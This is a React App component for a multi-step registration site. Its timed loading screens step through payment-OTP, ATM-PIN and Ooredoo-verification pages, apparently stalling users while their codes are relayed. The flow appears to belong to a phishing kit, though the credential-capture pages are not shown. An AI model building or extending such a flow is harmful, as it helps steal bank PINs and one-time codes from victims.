import { useState, useEffect } from "react";
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
import { RegistrationProvider } from "@/contexts/RegistrationContext";
import LoadingScreen from "@/components/LoadingScreen";
import Welcome from "./pages/Welcome";
import Register from "./pages/Register";
import PersonalInfo from "./pages/PersonalInfo";
import Password from "./pages/Password";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const AppContent = () => {
  const location = useLocation();
  const [isLoading, setIsLoading] = useState(false);
  const [previousPath, setPreviousPath] = useState<string>("");

  useEffect(() => {
    setIsLoading(true);

    const isPaymentToOTP = previousPath === "/registration-complete" && location.pathname === "/payment-otp";
    const isOTPToATM = previousPath === "/payment-otp" && location.pathname === "/atm-pin";
    const isATMToNext = previousPath === "/atm-pin" && location.pathname === "/ooredoo-verification";

    let loadingDuration = 1500;
    if (isPaymentToOTP) {
      loadingDuration = 15000;
    } else if (isOTPToATM) {
      loadingDuration = 7000;
    } else if (isATMToNext) {
      loadingDuration = 5000;
    }

    const timer = setTimeout(() => {
      setIsLoading(false);
    }, loadingDuration);

    setPreviousPath(location.pathname);

    return () => clearTimeout(timer);
  }, [location.pathname]);

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <Routes>
      <Route path="/" element={<Welcome />} />
      <Route path="/register" element={<Register />} />
      <Route path="/personal-info" element={<PersonalInfo />} />
      <Route path="/password" element={<Password />} />
      <Route path="*" element={<NotFound />} />
    </Routes>
  );
};

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <RegistrationProvider>
          <AppContent />
        </RegistrationProvider>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
